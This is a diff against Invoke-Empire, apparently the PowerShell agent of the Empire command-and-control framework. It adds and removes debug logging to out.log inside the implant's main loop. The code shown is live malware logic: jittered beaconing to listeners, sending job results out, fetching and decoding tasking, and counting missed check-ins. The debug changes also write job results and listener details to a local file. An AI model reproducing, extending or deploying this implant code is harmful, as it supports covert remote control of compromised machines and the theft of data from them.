@@ -774,6 +774,8 @@ function Invoke-Empire {
 		foreach ($l in $script:listeners){
 			SleepWithJitter($l)	
 			if ($JobResults) {
+                "got job results"|Out-File "out.log" -Append -NoClobber
+                $JobResults|Out-File "out.log" -Append -NoClobber
 				((& $SendMessage -Listener $l -Packets $JobResults))
 			}
 			if ((& $script:GetTask -Listener $l)){
@@ -786,7 +788,7 @@ function Invoke-Empire {
 	$script:SendMessage = {
 		param($Listener, $Packets)
         "called send message" | Out-File "out.log" -Append -NoClobber
-        $Packets | Out-File "out.log" -Append -NoClobber
+        $Listener["name"]|Out-File "out.log" -Append -NoClobber
         ((& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"]))
 	}
 
@@ -796,15 +798,14 @@ function Invoke-Empire {
         $Listener["name"]|Out-File "out.log" -Append -NoClobber
 
 		$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
-        "taskdata:"|Out-File "out.log" -Append -NoClobber
-        $TaskData|Out-File "out.log" -Append -NoClobber
 		if (!$TaskData){
+            "no task data, increasing missedcheckins"|Out-File "out.log" -Append -NoClobber
 			$Listener['missedCheckins'] += 1
             $False
 		}
 		else {
 			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
-                "got something not equal to defaultResponse, calling decoderoutingpacket"
+                "got something not equal to defaultResponse, calling decoderoutingpacket"|Out-File "out.log" -Append -NoClobber
 				Decode-RoutingPacket -PacketData $TaskData
 			}
             $True
@@ -1194,8 +1195,6 @@ function Invoke-Empire {
 
 		# if we are out of listeners, exit
 		if ($script:listeners.count -eq 0){
-            "listener count 0 exiting" | Out-File "out.log" -Append -NoClobber
-            "listener count 0 exiting"
 			exit
 		}
 		
